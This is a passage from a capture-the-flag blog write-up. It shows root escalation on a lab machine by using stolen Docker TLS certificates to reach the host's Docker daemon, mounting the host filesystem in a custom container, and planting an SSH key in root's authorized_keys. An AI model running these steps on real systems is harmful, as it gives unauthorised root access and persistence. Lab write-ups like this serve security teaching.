/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes128.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_des3.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_p8_clear.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_public.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes192.pem
/opt/code/localstack/.venv/lib/python3.8/site-packages/Cryptodome/SelfTest/PublicKey/test_vectors/ECC/ecc_p256_private_enc_aes256_gcm.pem  
/opt/code/localstack/.venv/lib/python3.8/site-packages/botocore/cacert.pem
/root/.local/share/virtualenv/wheel/3.8/image/1/CopyPipInstall/pip-20.3.1-py2.py3-none-any/pip/_vendor/certifi/cacert.pem
/root/.docker/key.pem
/root/.docker/ca-key.pem
/root/.docker/ca.pem
/root/.docker/cert.pem
</code></pre></div><p>The certificates inside <code>/root/.docker</code> are the right ones. We can take a look at <a target="_blank" href="https://docs.docker.com/engine/security/protect-access/">Docker&rsquo;s documentation</a> to know how to interact with a remote Docker using certificates. We can request to show its version:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376 version  
Client:
 Version:      17.05.0-ce
 API version:  1.29
 Go version:   go1.7.5
 Git commit:   89658be
 Built:        Fri May  5 15:36:11 2017
 OS/Arch:      linux/amd64

Server:
 Version:      20.10.8
 API version:  1.41 (minimum version 1.12)
 Go version:   go1.16.6
 Git commit:   75249d8
 Built:        Fri Jul 30 19:52:16 2021
 OS/Arch:      linux/amd64
 Experimental: false
</code></pre></div><p>Nice, it worked. As a result, we can use Docker as if we where in the host machine.</p><p>Notice that <code>172.17.0.1</code> is the IP address of the <code>docker0</code> interface from the host machine.</p><p>For convenience, we can set an alias (<code>mydocker</code>) to the large <code>docker</code> command as follows:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# alias mydocker='docker --tlsverify --tlscacert ca.pem --tlscert cert.pem --tlskey key.pem -H 172.17.0.1:2376'  
</code></pre></div><p>Using this alias, we can list the running containers:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# mydocker container ls
CONTAINER ID        IMAGE                               COMMAND                  CREATED             STATUS              PORTS                                                                                                  NAMES
910b69680838        localstack/localstack-full:0.12.6   "docker-entrypoint.sh"   20 hours ago        Up 20 hours         127.0.0.1:443-&gt;443/tcp, 127.0.0.1:4566-&gt;4566/tcp, 127.0.0.1:4571-&gt;4571/tcp, 127.0.0.1:8080-&gt;8080/tcp   localstack_main  
</code></pre></div><p>It shows only one instance of LocalStack. And we have these images available:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# mydocker images
REPOSITORY                   TAG                 IMAGE ID            CREATED             SIZE
localstack/localstack-full   0.12.6              7085b5de9f7c        7 months ago        888MB
localstack/localstack-full   &lt;none&gt;              0601ea177088        13 months ago       882MB  
lambci/lambda                nodejs12.x          22a4ada8399c        13 months ago       390MB
lambci/lambda                nodejs10.x          db93be728e7b        13 months ago       385MB
lambci/lambda                nodejs8.10          5754fee26e6e        13 months ago       813MB
</code></pre></div><p>The idea here is to run another container and mount the host&rsquo;s filesystem into the container, so that we can add an SSH public key into <code>/root/.ssh/authorized_keys</code> and connect as <code>root</code> via SSH.</p><p>We can create a pair of keys using <code>ssh-keygen</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh-keygen</span>
Generating public/private rsa key pair.
Enter file in which to save the key (~/.ssh/id_rsa): ./id_rsa
Enter passphrase (empty for no passphrase):
Enter same passphrase again:
Your identification has been saved in ./id_rsa
Your public key has been saved in ./id_rsa.pub
The key fingerprint is:
SHA256:3Nb1eAyClnfVUIvPYp270LB/EspMAcanzxZzNG62UUQ
The key's randomart image is:
+---[RSA 3072]----+
|         .    .=E|
|          +o. +.+|
|         .++o+++ |
|       . o.o++X=.|
|        S oo.@.B+|
|         .  * B..|
|           = + + |
|            + + o|
|               +.|
+----[SHA256]-----+

<span class="code-cyan">$</span> <span class="code-dark-green">cat</span> id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/N  
M5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=
</code></pre></div><p>To run a Docker container, we need to specify an image. We can use any of <code>lambci/lambda</code>, but we enter as a non-privileged user, so we won&rsquo;t be able to access files owned by <code>root</code> in the host machine. And we will get some errors if we use <code>localstack/localstack:0.12.6</code> because of already existing volumes.</p><p>Therefore, we must find a way to create a custom Docker image. Since the host machine has no Internet connection, we need to use an existing image as a base. There is a built-in image in Docker called <a target="_blank" href="https://hub.docker.com/_/scratch/"><code>scratch</code></a> that is just an empty container.</p><p>To actually create an image from <a target="_blank" href="https://hub.docker.com/_/scratch/"><code>scratch</code></a> we need to copy some binaries inside. And to make the binaries work, we also need to copy some shared libraries (i.e. Glibc).</p><p>We will copy binaries <code>/bin/sh</code>, <code>/bin/cat</code> and <code>/bin/echo</code> so that I can use a shell prompt and perform read and write operations. These binaries use the same shared library:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# ldd /bin/sh
        /lib/ld-musl-x86_64.so.1 (0x7f43b9444000)
        libc.musl-x86_64.so.1 =&gt; /lib/ld-musl-x86_64.so.1 (0x7f43b9444000)  
bash-5.0# ldd /bin/cat
        /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000)
        libc.musl-x86_64.so.1 =&gt; /lib/ld-musl-x86_64.so.1 (0x7f55e6a2c000)
bash-5.0# ldd /bin/echo
        /lib/ld-musl-x86_64.so.1 (0x7f691e268000)
        libc.musl-x86_64.so.1 =&gt; /lib/ld-musl-x86_64.so.1 (0x7f691e268000)
</code></pre></div><p>So, the <code>Dockerfile</code> used to build the image is this one:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">FROM</span> <span class="mtk1">scratch</span>

<span class="mtk5">WORKDIR</span> <span class="mtk1">/bin</span>
<span class="mtk5">COPY</span> <span class="mtk1">sh</span> <span class="mtk1">.</span>
<span class="mtk5">COPY</span> <span class="mtk1">cat</span> <span class="mtk1">.</span>
<span class="mtk5">COPY</span> <span class="mtk1">echo</span> <span class="mtk1">.</span>

<span class="mtk5">WORKDIR</span> <span class="mtk1">/lib</span>
<span class="mtk5">COPY</span> <span class="mtk1">ld-musl-x86_64.so.1</span> <span class="mtk1">.</span>  
</code></pre></div><p>We will copy all these files to the current working directory and build the image from there as well. The image is called <code>pwn</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# echo -e 'FROM scratch\nWORKDIR /bin\nCOPY sh .\nCOPY cat .\nCOPY echo .\nWORKDIR /lib\nCOPY ld-musl-x86_64.so.1 .' &gt; Dockerfile  
bash-5.0# cp /bin/sh .
bash-5.0# cp /bin/cat .
bash-5.0# cp /bin/echo .
bash-5.0# cp /lib/ld-musl-x86_64.so.1 .
bash-5.0# mydocker build -t pwn .
Sending build context to Docker daemon  3.882MB
Step 1/7 : FROM scratch
 ---&gt;
Step 2/7 : WORKDIR /bin
 ---&gt; Running in 59c11f6289e3
Removing intermediate container 59c11f6289e3
 ---&gt; 2d5ecb48eafb
Step 3/7 : COPY sh .
 ---&gt; 5d2277fa1fb4
Step 4/7 : COPY cat .
 ---&gt; 52a4554cb022
Step 5/7 : COPY echo .
 ---&gt; 11c3ea334ad7
Step 6/7 : WORKDIR /lib
 ---&gt; Running in d7554e33572d
Removing intermediate container d7554e33572d
 ---&gt; d9142f99a2e0
Step 7/7 : COPY ld-musl-x86_64.so.1 .
 ---&gt; 6f7cf378f889
Successfully built 6f7cf378f889
Successfully tagged pwn:latest
</code></pre></div><p>We can verify that it is actually created:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# mydocker images
REPOSITORY                   TAG                 IMAGE ID            CREATED              SIZE
pwn                          latest              6f7cf378f889        About a minute ago   2.28MB
localstack/localstack-full   0.12.6              7085b5de9f7c        7 months ago         888MB
localstack/localstack-full   &lt;none&gt;              0601ea177088        13 months ago        882MB  
lambci/lambda                nodejs12.x          22a4ada8399c        13 months ago        390MB
lambci/lambda                nodejs10.x          db93be728e7b        13 months ago        385MB
lambci/lambda                nodejs8.10          5754fee26e6e        13 months ago        813MB
</code></pre></div><p>And then we can run a container using this image specifying that <code>/</code> from the host machine is mounted inside <code>/mnt</code> in the Docker container:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">bash-5.0# mydocker run --rm -v /:/mnt -it pwn /bin/sh  
/lib # cat /mnt/etc/hostname
stacked
</code></pre></div><p>As it can be seen, <code>/mnt/etc/hostname</code> shows <code>stacked</code>, so we are reading files from the host machine. Hence, let&rsquo;s add the public SSH key into <code>/mnt/root/.ssh/authorized_keys</code> (that is <code>/root/.ssh/authorized_keys</code> in the host file system):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/lib # echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=' &gt; /mnt/root/.ssh/authorized_keys  
/lib # cat /mnt/root/.ssh/authorized_keys
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDAh+6EhWWDF/im0ZA/M4jy+bzJWUOtZGrYbWUSKZsCXV2+7Fac0kE7wRW+zzIedFSVdC+xPO8MiIxaTblHlDodkP173F9Rmo/9hx7FLBM78SCwFcAJyqq1BAzcrOrGTE3kIwOx0Wv3xrRcLBWvCZnOo3UCwr8ynxmU5L05+0rGQVz4vZcGrT/4hbzgXCJBIW2ku0kRH04+t1zPikrLWDm25XR3UYQELGxsRJx+QJB526jRguCiqdlpz27S3LosJ+VxNamsoltl5EnHPtAZVsGHFTq0oVY3FXimnAU5NfrD2zp5ozbTlVFLvMO+55df4+7mJaeCD1jGE1gxklr5Dnpwr82Ef/+aiWMltAZC3XS6GwQqpNVqKeFdW6nY0mgggMYvu7zNIX55NTCb40G6PtRVLLpd5c9OBi9DpfGHBrV51aHleSbk/NM5kfP6urPfICVXSvgCGNcGKQeRheDBsiNMaeQ4zHfQscZtJL7sJtonT6gqU2JVKhUkM2bPuPBHNN0=
</code></pre></div><p>Finally, we are able to login as <code>root</code> in the machine using SSH:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">ssh</span> -i id_rsa root@10.10.11.112  
root@stacked:~# cat root.txt
bd97095c84e01bc86ec04f08be824f38
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l mt6-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#port-scanning">Port scanning</a></li><li><a href="#web-enumeration">Web enumeration</a></li><li><a href="#compromising-localstack-mitm-proxy">Compromising LocalStack. MITM proxy</a></li><li><a href="#compromising-localstack-rce">Compromising LocalStack. RCE</a></li><li><a href="#finding-xss">Finding XSS</a></li><li><a href="#foothold-on-the-container">Foothold on the container</a></li><li><a href="#system-enumeration">System enumeration</a></li><li><a href="#privilege-escalation-in-the-container">Privilege escalation in the container</a></li><li><a href="#privilege-escalation-on-the-machine">Privilege escalation on the machine</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>